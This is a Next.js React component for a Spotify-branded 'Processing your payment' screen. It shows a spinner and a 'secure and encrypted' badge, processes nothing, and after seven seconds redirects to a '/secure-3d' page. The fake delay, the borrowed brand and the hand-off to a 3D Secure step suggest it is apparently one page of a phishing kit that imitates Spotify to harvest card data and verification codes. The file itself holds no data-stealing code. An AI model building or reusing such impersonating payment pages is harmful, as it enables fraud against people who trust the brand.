"use client"

import { SpotifyHeader } from "@/components/spotify-header"
import { SpotifyFooter } from "@/components/spotify-footer"
import { useRouter } from "next/navigation"
import { useEffect } from "react"

export default function ProcessingClient() {
  const router = useRouter()

  useEffect(() => {
    // Wait 7 seconds then redirect to 3D secure page
    const timer = setTimeout(() => {
      router.push("/secure-3d")
    }, 7000)

    return () => clearTimeout(timer)
  }, [router])

  return (
    <div className="min-h-screen bg-[#121212] flex flex-col">
      <SpotifyHeader />
      <main className="flex-1 flex items-center justify-center p-4">
        <div className="w-full max-w-md space-y-8 text-center">
          {/* Green Loading Circle */}
          <div className="flex justify-center">
            <div className="relative w-24 h-24 sm:w-32 sm:h-32">
              <div className="absolute inset-0 border-4 border-[#1ed760]/20 rounded-full"></div>
              <div className="absolute inset-0 border-4 border-transparent border-t-[#1ed760] rounded-full animate-spin"></div>
            </div>
          </div>

          {/* Processing Text */}
          <div className="space-y-3">
            <h1 className="text-2xl sm:text-3xl font-bold text-white">Processing your payment</h1>
            <p className="text-[#a7a7a7] text-sm sm:text-base">
              Please wait while we securely process your payment information...
            </p>
          </div>

          {/* Security Badge */}
          <div className="flex items-center justify-center gap-2 text-[#a7a7a7] text-xs pt-4">
            <svg
              className="w-4 h-4"
              fill="none"
              stroke="currentColor"
              viewBox="0 0 24 24"
              xmlns="http://www.w3.org/2000/svg"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={2}
                d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
              />
            </svg>
            <span>Your payment is secure and encrypted</span>
          </div>
        </div>
      </main>
      <SpotifyFooter />
    </div>
  )
}
